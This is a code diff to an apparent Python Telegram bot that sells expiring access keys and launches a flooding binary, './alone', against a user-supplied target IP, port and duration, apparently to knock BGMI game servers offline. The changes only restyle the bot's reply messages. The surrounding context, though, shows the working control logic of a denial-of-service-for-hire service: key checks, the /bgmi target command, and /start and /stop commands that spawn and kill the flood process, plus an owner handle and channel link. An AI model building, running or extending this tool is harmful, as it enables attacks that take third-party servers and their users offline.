@@ -73,7 +73,7 @@ async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
                 key = generate_key()
                 keys[key] = expiration_date
                 save_keys()
-                response = f"🔑 🅺︎🅴︎🆈︎ 🅶︎🅴︎🅽︎🆁︎🅰︎🆃︎🅴︎🅳︎\n {key}\n⏳ 🅅🄰🄻🄸🄳🄸🅃\n {expiration_date}\n\n🅁🄴🄳🄴🄴🄼  🅈🄾🅄🅁  🄺🄴🅈. /redeem"
+                response = f" 🅺︎🅴︎🆈︎ 🅶︎🅴︎🅽︎🆁︎🅰︎🆃︎🅴︎🅳︎\n\n 🅈🄾🅄🅁 🄺🄴🅈 ᕗ {key}\n\n 🅅🄰🄻🄸🄳🄸🅃 ᕗ {expiration_date}\n\n🅁🄴🄳🄴🄴🄼  🅈🄾🅄🅁  🄺🄴🅈 ᕗ /redeem"
             except ValueError:
                 response = f"𝙐𝙎𝘼𝙂𝙀 /genkey 1 𝙃𝙊𝙐𝙍𝙎 𝙖𝙣𝙙 𝘿𝘼𝙔𝙎"
         else:
@@ -103,7 +103,7 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         else:
             response = f"𝘽𝙊𝙏 𝙊𝙒𝙉𝙀𝙍 - @GODxAloneBOY"
     else:
-        response = f"𝙐𝙎𝙀 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 𝙏𝙊 𝙍𝙀𝘿𝙀𝙀𝙈 𝙆𝙀𝙔. /redeem"
+        response = f"𝙐𝙎𝙀 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 𝙏𝙊 𝙍𝙀𝘿𝙀𝙀𝙈 𝙆𝙀𝙔 ᕗ /redeem"
 
     await update.message.reply_text(response)
 
@@ -113,11 +113,11 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
 
     if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("🔑 𝙔𝙊𝙐 𝘼𝙍𝙀 𝙉𝙊𝙏 𝘼𝙐𝙏𝙊𝙍𝙄𝙕𝙀𝘿. 𝘿𝙈 𝙊𝙒𝙉𝙀𝙍 @GODxAloneBOY")
+        await update.message.reply_text("❌ 𝙔𝙊𝙐 𝘼𝙍𝙀 𝙉𝙊𝙏 𝘼𝙐𝙏𝙊𝙍𝙄𝙕𝙀𝘿. 𝘿𝙈 𝙊𝙒𝙉𝙀𝙍 @GODxAloneBOY")
         return
 
     if len(context.args) != 3:
-        await update.message.reply_text(' 𝙀𝙓𝘼𝙈𝙋𝙇𝙀 𝙐𝙎𝙀 /bgmi «𝙄𝙋» «𝙋𝙊𝙍𝙏» «𝘿𝙐𝙍𝘼𝙏𝙊𝙄𝙉»')
+        await update.message.reply_text(' 𝙀𝙓𝘼𝙈𝙋𝙇𝙀 𝙐𝙎𝙀  /bgmi «𝙄𝙋» «𝙋𝙊𝙍𝙏» «𝘿𝙐𝙍𝘼𝙏𝙊𝙄𝙉»')
         return
 
     target_ip = context.args[0]
@@ -125,7 +125,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     duration = context.args[2]
 
     flooding_command = ['./alone', target_ip, port, duration, str(DEFAULT_THREADS)]
-    await update.message.reply_text(f'😈🅰︎🆃︎🆃︎🅰︎🅲︎🅺︎ 🆃︎🅰︎🆁︎🅶︎🅴︎🆃︎ 🆂︎🅴︎🆃😈︎\n\n👙 🅃🄰🅁🄶🄴🅃 {target_ip}\n🍆 🄿🄾🅁🅃 {port} \n⏳ 🄳🅄🅁🄰🅃🄾🄸🄽 {duration}\n\n𝙏𝘼𝙋 𝙏𝙊 𝙎𝙏𝘼𝙍𝙏 𝘽𝙐𝙏𝙏𝙊𝙉')
+    await update.message.reply_text(f'🔰 🆃︎🅰︎🆁︎🅶︎🅴︎🆃 ︎ 🆂︎🅴︎🆃 🔰︎\n\n👙 🅃🄰🅁🄶🄴🅃 ᕗ {target_ip}\n🍆 🄿🄾🅁🅃 ᕗ {port} \n⏳ 🄳🅄🅁🄰🅃🄾🄸🄽 ᕗ {duration}\n\n𝙏𝘼𝙋 𝙏𝙊 𝙎𝙏𝘼𝙍𝙏 𝘽𝙐𝙏𝙏𝙊𝙉')
 
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -137,7 +137,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     if flooding_process is not None:
-        await update.message.reply_text('🔰🅰︎🆃︎🆃︎🅰︎🅲︎🅺︎ 🅿︎🅴︎🅽︎🅳︎🅸︎🅽︎🅶🔰︎\n\n𝙐𝙎𝙀 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 𝙏𝙊 𝙎𝙏𝙊𝙋 /stop')
+        await update.message.reply_text('🔰 🅰︎🆃︎🆃︎🅰︎🅲︎🅺 ︎ 🅿︎🅴︎🅽︎🅳︎🅸︎🅽︎🅶 🔰︎\n\n𝙐𝙎𝙀 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 𝙏𝙊 𝙎𝙏𝙊𝙋 /stop')
         return
 
     if flooding_command is None:
@@ -145,7 +145,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     flooding_process = subprocess.Popen(flooding_command)
-    await update.message.reply_text('🔰🅰︎🆃︎🆃︎🅰︎🅲︎🅺︎ 🆂︎🆃︎🅰︎🆁︎🆃︎🅴︎🅳🔰︎\n𝙅𝙊𝙄𝙉 𝙈𝙔 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈 𝘾𝙃𝘼𝙉𝙉𝙀𝙇\n𝙎𝙀𝙉𝘿 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝙏𝙊 𝙊𝙒𝙉𝙀𝙍 @GODxAloneBOY\n\n🇮🇳 https://t.me/+03wLVBPurPk2NWRl ')
+    await update.message.reply_text('🔰 🅰︎🆃︎🆃︎🅰︎🅲︎🅺︎  🆂︎🆃︎🅰︎🆁︎🆃︎🅴︎🅳 🔰︎\n𝙅𝙊𝙄𝙉 𝙈𝙔 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈 𝘾𝙃𝘼𝙉𝙉𝙀𝙇\n𝙎𝙀𝙉𝘿 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝙏𝙊 𝙊𝙒𝙉𝙀𝙍 @GODxAloneBOY\n\n🇮🇳 https://t.me/+03wLVBPurPk2NWRl ')
 
 
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -162,7 +162,7 @@ async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     flooding_process.terminate()
     flooding_process = None
-    await update.message.reply_text('🔰🅰︎🆃︎🆃︎🅰︎🅲︎🅺︎ 🆂︎🆃︎🅾︎🅿︎🅳🔰︎\n\n𝙏𝙊𝙋 𝙏𝙊 𝙍𝙀𝙎𝙏𝘼𝙍𝙏 𝘼𝙏𝙏𝘼𝘾𝙆 /start')
+    await update.message.reply_text('🔰 🅰︎🆃︎🆃︎🅰︎🅲︎🅺︎  🆂︎🆃︎🅾︎🅿︎🅳 🔰︎\n\n𝙏𝙊𝙋 𝙏𝙊 𝙍𝙀𝙎𝙏𝘼𝙍𝙏 𝘼𝙏𝙏𝘼𝘾𝙆 /start')
     
     await update.message.reply_text(response)
 
